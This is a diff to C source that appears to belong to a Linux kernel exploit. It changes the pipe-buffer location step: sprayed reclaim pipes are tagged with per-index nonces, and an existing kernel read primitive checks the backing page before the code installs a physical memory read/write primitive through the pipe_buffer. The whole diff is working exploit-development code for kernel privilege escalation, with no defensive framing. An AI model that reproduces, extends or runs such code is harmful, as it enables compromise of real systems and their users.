@@ -1,4 +1,10 @@
 #include "common.h"
+#define PIPE_NONCE_BASE  0x533232554e4f4e43ULL   /* "S22UNONC" */
+
+static inline uint64_t pipe_nonce_for_index(size_t index)
+{
+    return PIPE_NONCE_BASE ^ (0x9e3779b97f4a7c15ULL * (index + 1));
+}
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 #include P0_FINGERPRINT_HEADER
@@ -62,6 +68,7 @@ int physrw_write_ok;
 int pipe_scan_vmemmap;
 int pipe_scan_ops;
 int pipe_scan_len;
+size_t pipe_scan_nonce_reject;
 int pipe_probe_found;
 uint64_t pipe_probe_page;
 uint64_t pipe_probe_ops;
@@ -487,6 +494,8 @@ int find_pipe_buffer(int fd, uintptr_t base) {
   pipe_scan_vmemmap = 0;
   pipe_scan_ops = 0;
   pipe_scan_len = 0;
+  pipe_scan_nonce_reject = 0;
+
   pipe_scan_first_page = 0;
   pipe_scan_first_ops = 0;
   pipe_scan_first_len = 0;
@@ -532,6 +541,28 @@ int find_pipe_buffer(int fd, uintptr_t base) {
       continue;
     }
 
+    /* Priority 1.5: verify the pipe's real page holds the nonce for the
+     * inferred index. Rejects coincidental pipe_buffers whose .len happens
+     * to fall in range but whose backing page is a different spray. */
+    {
+        size_t __idx = (size_t)pb.len - 1;
+        uint64_t __expected = pipe_nonce_for_index(__idx);
+        uint64_t __mask = (pb.len >= 8) ? ~0ULL
+                                        : ((1ULL << (pb.len * 8)) - 1ULL);
+        uintptr_t __real_page = page_to_direct(pb.page);
+        uint8_t __first8[8];
+        if (kernel_read_data(fd, __real_page, __first8, sizeof(__first8))
+                != (ssize_t)sizeof(__first8)) {
+            pipe_scan_nonce_reject++;
+            continue;
+        }
+        uint64_t __got;
+        memcpy(&__got, __first8, sizeof(__got));
+        if ((__got & __mask) != (__expected & __mask)) {
+            pipe_scan_nonce_reject++;
+            continue;
+        }
+    }
     pipebuf_addr = base + off;
     pipebuf_pipe_idx = (int)pb.len - 1;
     pipe_probe_found = 1;
@@ -753,16 +784,18 @@ int install_pipe_physrw(int fd) {
     return 0;
   }
 
-  char marker[PIPE_RECLAIM];
-  memset(marker, 0x61, sizeof(marker));
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
+      uint8_t buf[PIPE_RECLAIM];
+      uint64_t nonce = pipe_nonce_for_index(i);
+      for (size_t j = 0; j < i + 1; j++) {
+          buf[j] = (uint8_t)((nonce >> ((j & 7) * 8)) & 0xFF);
+      }
+      SYSCHK(write(pipe_fds_reclaim[i][1], buf, i + 1));
   }
-
   int found = find_pipe_buffer(fd, pipebuf_page_base);
-  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
+  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d nonce_reject=%zu\n",
           found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
-          pipe_scan_ops, pipe_scan_len);
+          pipe_scan_ops, pipe_scan_len, pipe_scan_nonce_reject);
   if (!found) {
     return 0;
   }
